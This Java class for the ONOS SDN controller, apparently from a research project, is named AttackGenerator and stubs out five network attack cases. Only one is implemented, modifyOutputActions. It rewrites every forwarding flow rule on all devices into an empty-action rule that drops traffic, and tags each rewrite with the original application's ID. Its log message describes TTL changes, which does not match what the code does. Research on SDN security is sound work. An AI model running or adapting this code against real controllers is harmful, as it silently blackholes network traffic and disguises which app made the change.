package iitp2018;

import org.onosproject.core.ApplicationId;
import org.onosproject.core.CoreService;
import org.onosproject.net.Device;
import org.onosproject.net.PortNumber;
import org.onosproject.net.device.DeviceService;
import org.onosproject.net.flow.*;
import org.onosproject.net.flow.instructions.Instruction;
import org.onosproject.net.flow.instructions.Instructions;
import org.onosproject.net.link.LinkService;
import org.onosproject.openflow.controller.OpenFlowController;
import org.slf4j.Logger;

import java.util.Iterator;

import static org.slf4j.LoggerFactory.getLogger;

public class AttackGenerator {

    protected OpenFlowController controller;
    protected DeviceService deviceService;
    protected FlowRuleService flowRuleService;
    protected CoreService coreService;
    protected LinkService linkService;

    private final Logger log = getLogger(getClass());

    public AttackGenerator(OpenFlowController controller, DeviceService deviceService, FlowRuleService flowRuleService,
                           CoreService coreService, LinkService linkService) {
        this.controller = controller;
        this.deviceService = deviceService;
        this.flowRuleService = flowRuleService;
        this.coreService = coreService;
        this.linkService = linkService;
    }

    // case1
    public void loopInjector() {

    }

    // case2
    public void modifyOutputActions() {
        Iterator<Device> deviceIterator = deviceService.getAvailableDevices().iterator();
        while(deviceIterator.hasNext()) {
            Device d = deviceIterator.next();
            Iterator<FlowEntry> ruleIterator = flowRuleService.getFlowEntries(d.id()).iterator();
            while(ruleIterator.hasNext()) {
                FlowEntry entry = ruleIterator.next();
                entry.treatment().allInstructions().forEach(originInst -> {
                    if (originInst.type() == Instruction.Type.OUTPUT) {
                        Instructions.OutputInstruction outputInst = (Instructions.OutputInstruction) originInst;
                        if (outputInst.port() != PortNumber.CONTROLLER) {
                            TrafficTreatment newTreatment = DefaultTrafficTreatment.builder()
                                    .build();
                            ApplicationId targetAppId = coreService.getAppId(entry.appId());
                            FlowRule rule = DefaultFlowRule.builder()
                                    .forDevice(d.id())
                                    .withSelector(entry.selector())
                                    .withTreatment(newTreatment)
                                    .withPriority(entry.priority())
                                    .fromApp(targetAppId)
                                    .makeTemporary(entry.timeout())
                                    .build();

                            log.info("flow rule: {}", rule);

                            FlowRuleOperations.Builder ops = FlowRuleOperations.builder();
                            ops.add(rule);
                            String description = "[AppAgent] Modify flow rules having decrement TTL values";
                            flowRuleService.apply(ops.build(new FlowRuleOperationsContext() {
                                @Override
                                public void onSuccess(FlowRuleOperations ops) {
                                    log.info(description + " success: " + ops.toString() + ", " + rule.toString());
                                }

                                @Override
                                public void onError(FlowRuleOperations ops) {
                                    log.info(description + " error: " + ops.toString() + ", " + rule.toString());
                                }
                            }));
                        }
                    }
                });
            }
        }
    }

    // case3
    public void removeLinkInformation() {

    }

    // case4
    public void exitController() {

    }

    // case5
    public void exhaustResources() {

    }
}
